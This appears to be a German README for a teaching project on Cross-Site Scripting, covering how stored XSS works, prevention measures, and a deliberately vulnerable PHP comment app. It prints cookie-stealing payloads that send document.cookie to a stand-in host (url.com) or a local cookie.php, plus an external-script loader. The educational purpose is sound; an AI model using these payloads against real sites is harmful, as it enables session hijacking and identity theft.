# XSS-Schwachstellen/Angriffe

Cross-Site Scripting (XSS) ist ein clientseitiger Code-Injection-Angriff. Der Angreifer zielt darauf ab, schädliche Skripte in einem Webbrowser des Opfers auszuführen, indem er schädlichen Code in eine legitime Webseite oder Webanwendung einfügt. Der eigentliche Angriff erfolgt, wenn das Opfer die Webseite oder Webanwendung besucht, die den bösartigen Code ausführt. Die Webseite oder Webanwendung wird zu einem Vehikel, um das bösartige Skript an den Browser des Benutzers zu übermitteln. Anfällige Vehikel, die häufig für Cross-Site-Scripting-Angriffe verwendet werden, sind Foren, Message Boards und Webseiten, die Kommentare zulassen.

Eine Webseite oder Webanwendung ist anfällig für XSS, wenn sie nicht bereinigte Benutzereingaben in der von ihr generierten Ausgabe verwendet. Diese Benutzereingaben müssen dann vom Browser des Opfers geparst werden. XSS-Angriffe sind in VBScript, ActiveX, Flash und sogar CSS möglich. Sie kommen jedoch am häufigsten in JavaScript vor, vor allem, weil JavaScript für die meisten Surferlebnisse von grundlegender Bedeutung ist.

## Was kann der Angreifer mit JavaScript machen?

XSS-Schwachstellen werden als weniger gefährlich wahrgenommen als beispielsweise SQL-Injection-Schwachstellen. Die Folgen der Möglichkeit, JavaScript auf einer Webseite auszuführen, mögen auf den ersten Blick nicht schlimm erscheinen. Die meisten Webbrowser führen JavaScript in einer sehr streng kontrollierten Umgebung aus. JavaScript hat eingeschränkten Zugriff auf das Betriebssystem des Benutzers und die Dateien des Benutzers. JavaScript kann jedoch immer noch gefährlich sein, wenn es als Teil schädlicher Inhalte missbraucht wird:

* Bösartiges JavaScript hat Zugriff auf alle Objekte, auf die der Rest der Webseite Zugriff hat. Dies beinhaltet den Zugriff auf die Cookies des Benutzers. Cookies werden häufig verwendet, um Sitzungstoken zu speichern. Wenn ein Angreifer das Sitzungscookie eines Benutzers erhalten kann, kann er sich als dieser Benutzer ausgeben, Aktionen im Namen des Benutzers ausführen und Zugriff auf die sensiblen Daten des Benutzers erlangen.
* JavaScript kann das Browser-DOM lesen und beliebige Änderungen daran vornehmen. Glücklicherweise ist dies nur innerhalb der Seite möglich, auf der JavaScript ausgeführt wird.
* JavaScript kann das XMLHttpRequest-Objekt verwenden, um HTTP-Anforderungen mit beliebigem Inhalt an beliebige Ziele zu senden.
* JavaScript in modernen Browsern kann HTML5-APIs verwenden. Beispielsweise kann es Zugriff auf die Geolokalisierung des Benutzers, die Webcam, das Mikrofon und sogar auf bestimmte Dateien aus dem Dateisystem des Benutzers erhalten. Die meisten dieser APIs erfordern eine Benutzeranmeldung, aber der Angreifer kann Social Engineering verwenden, um diese Einschränkung zu umgehen.

In Kombination mit Social Engineering ermöglichen die oben genannten Methoden Kriminellen, fortschrittliche Angriffe durchzuführen, darunter Cookie-Diebstahl, das Einschleusen von Trojanern, Keylogging, Phishing und Identitätsdiebstahl. XSS-Schwachstellen bieten die perfekte Grundlage, um Angriffe zu ernsteren auszuweiten. Cross-Site Scripting kann auch in Verbindung mit anderen Angriffsarten verwendet werden, beispielsweise Cross-Site Request Forgery (CSRF).

## Wie Cross-Site-Scripting funktioniert

Ein typischer XSS-Angriff besteht aus zwei Phasen:

* Um schädlichen JavaScript-Code im Browser eines Opfers auszuführen, muss ein Angreifer zunächst einen Weg finden, schädlichen Code (Payload) in eine Webseite einzuschleusen, die das Opfer besucht.
* Danach muss das Opfer die Webseite mit dem bösartigen Code besuchen. Richtet sich der Angriff gegen bestimmte Opfer, kann der Angreifer Social Engineering und/oder Phishing verwenden, um eine bösartige URL an das Opfer zu senden.

Damit Schritt eins möglich ist, muss die anfällige Website Benutzereingaben direkt in ihre Seiten aufnehmen. Ein Angreifer kann dann eine schädliche Zeichenfolge einfügen, die innerhalb der Webseite verwendet und vom Browser des Opfers als Quellcode behandelt wird. Es gibt auch Varianten von XSS-Angriffen, bei denen der Angreifer den Benutzer mithilfe von Social Engineering zum Besuch einer URL verleitet und die Payload Teil des Links ist, auf den der Benutzer klickt.

## Cookies mit XSS stehlen

Kriminelle verwenden XSS oft, um Cookies zu stehlen. Dadurch können sie sich als Opfer ausgeben. Der Angreifer kann das Cookie auf viele Arten an seinen eigenen Server senden. Eine davon besteht darin, das folgende clientseitige Skript im Browser des Opfers auszuführen:

```
<script>
window.location="http://url.com/?cookie=" + document.cookie
</script>
```

* Der Angreifer fügt eine Nutzlast in die Datenbank der Website ein, indem er ein anfälliges Formular mit schädlichem JavaScript-Inhalt sendet.
* Das Opfer fordert die Webseite vom Webserver an.
* Der Webserver stellt dem Browser des Opfers die Seite mit der Nutzlast des Angreifers als Teil des HTML-Bodys bereit.
* Der Browser des Opfers führt das bösartige Skript aus, das im HTML-Text enthalten ist. In diesem Fall sendet es das Cookie des Opfers an den Server des Angreifers.
* Der Angreifer muss jetzt einfach das Cookie des Opfers extrahieren, wenn die HTTP-Anfrage beim Server ankommt.
* Der Angreifer kann jetzt das gestohlene Cookie des Opfers zur Identitätsfälschung verwenden.


### `<script>` Tag
The `<script>` tag is the most straightforward XSS payload. A script tag can reference external JavaScript code or you can embed the code within the script tag itself.

## Cross-Site-Scripting-Angriffsvektoren
Im Folgenden finden Sie eine Liste gängiger XSS-Angriffsvektoren, die ein Angreifer verwenden könnte, um die Sicherheit einer Website oder Webanwendung durch einen XSS-Angriff zu gefährden. Eine umfangreichere Liste von Beispielen für XSS-Nutzdaten wird von der OWASP-Organisation gepflegt: XSS Filter Evasion Cheat Sheet.

```
<!-- External script -->
<script src=http://url.com/xss.js></script>
<!-- Embedded script -->
<script> alert("XSS"); </script>
```
## XSS verhindern

Um sich vor XSS zu schützen, müssen Sie Ihre Eingabe bereinigen. Ihr Anwendungscode sollte niemals als Eingabe empfangene Daten direkt an den Browser ausgeben, ohne sie auf schädlichen Code zu überprüfen.

Das Verhindern von Cross-Site-Scripting (XSS) ist nicht einfach. Spezifische Präventionstechniken hängen vom Subtyp der XSS-Schwachstelle, vom Nutzungskontext der Benutzereingaben und vom Programmier-Framework ab. Es gibt jedoch bestimmte allgemeine strategische Prinzipien, die Sie befolgen sollten, um Ihre Webanwendung sicher zu halten.

* Bewusstsein schulen und aufrechterhalten – Um Ihre Webanwendung sicher zu halten, muss sich jeder, der an der Erstellung der Webanwendung beteiligt ist, der Risiken bewusst sein, die mit XSS-Schwachstellen verbunden sind. Sie sollten allen Ihren Entwicklern, QA-Mitarbeitern, DevOps und SysAdmins geeignete Sicherheitsschulungen anbieten. Sie können beginnen, indem Sie sie auf diese Seite verweisen.
* Benutzereingaben nicht vertrauen – Behandeln Sie alle Benutzereingaben als nicht vertrauenswürdig. Jede Benutzereingabe, die als Teil der HTML-Ausgabe verwendet wird, birgt das Risiko eines XSS. Behandeln Sie Eingaben von authentifizierten und/oder internen Benutzern genauso wie öffentliche Eingaben.
* Verwenden Sie Escape/Kodierung - Verwenden Sie eine geeignete Escape-/Kodierungstechnik, je nachdem, wo Benutzereingaben verwendet werden sollen: HTML-Escape, JavaScript-Escape, CSS-Escape, URL-Escape usw. Verwenden Sie vorhandene Bibliotheken zum Escape, schreiben Sie keine eigenen, es sei denn absolut notwendig.
* HTML bereinigen – Wenn die Benutzereingabe HTML enthalten muss, können Sie sie nicht maskieren/codieren, da dies gültige Tags beschädigen würde. Verwenden Sie in solchen Fällen eine vertrauenswürdige und verifizierte Bibliothek, um HTML zu parsen und zu bereinigen. Wählen Sie die Bibliothek entsprechend Ihrer Entwicklungssprache aus, z. B. HtmlSanitizer für .NET oder SanitizeHelper für Ruby on Rails.
* HttpOnly-Flag setzen – Um die Folgen einer möglichen XSS-Schwachstelle abzumildern, setzen Sie das HttpOnly-Flag für Cookies. Wenn Sie dies tun, sind solche Cookies nicht über clientseitiges JavaScript zugänglich.
* Verwenden Sie eine Inhaltssicherheitsrichtlinie – Um die Folgen einer möglichen XSS-Schwachstelle zu mindern, verwenden Sie auch eine Inhaltssicherheitsrichtlinie (CSP). CSP ist ein HTTP-Antwortheader, mit dem Sie die dynamischen Ressourcen deklarieren können, die abhängig von der Anforderungsquelle geladen werden dürfen.
* Scannen Sie regelmäßig (mit Acunetix) – XSS-Schwachstellen können von Ihren Entwicklern oder über externe Bibliotheken/Module/Software eingeführt werden. Sie sollten Ihre Webanwendungen regelmäßig mit einem Web-Schwachstellen-Scanner wie Acunetix scannen. Wenn Sie Jenkins verwenden, sollten Sie das Acunetix-Plugin installieren, um jeden Build automatisch zu scannen.

## Voraussetzungen

Sie müssen über die folgenden Programme/Pakete verfügen, um dieses Projekt auszuführen.

* Apache: 2.4.46
* PHP: 7.2.33
* MariaDB: 10.4.14
* phpMyAdmin: 5.0.2

Hinweis: Der XAMPP-Server umfasst alle oben genannten Technologien. https://www.apachefriends.org/download.html

## Cookies mit dem XSS-Entwicklungsansatz stehlen

Es wird eine einfache PHP-basierte Webanwendung entwickelt, die über Post-Kommentar-Funktionalität verfügt, Kommentare in Sitzungen anstelle von Datenbanken speichert, nur um den XSS-Angriff zu erklären. Wenn ein Benutzer bösartigen Code in das Kommentartextfeld kommentiert, wird dieser ausgeführt, wenn ein anderer Benutzer versucht, dieselbe Webanwendung zu besuchen. Der bösartige Code kann dem Besucher Schaden zufügen. Hier habe ich verwendet, um ein Cookie an eine andere Seite zu senden. Diese Seite kann ein Link zu einem anderen Server sein, der das Cookie der Benutzer speichert.

* Post.php öffnen und unter folgendem Code eingeben und absenden.
```
<Skript>
window.location="cookie.php/?cookie=" + document.cookie
</script>
```
* Besuchen Sie erneut dieselbe Seite post.php und Sie werden automatisch zu cookie.php weitergeleitet, wo Sie das Cookie Ihres Browsers sehen.
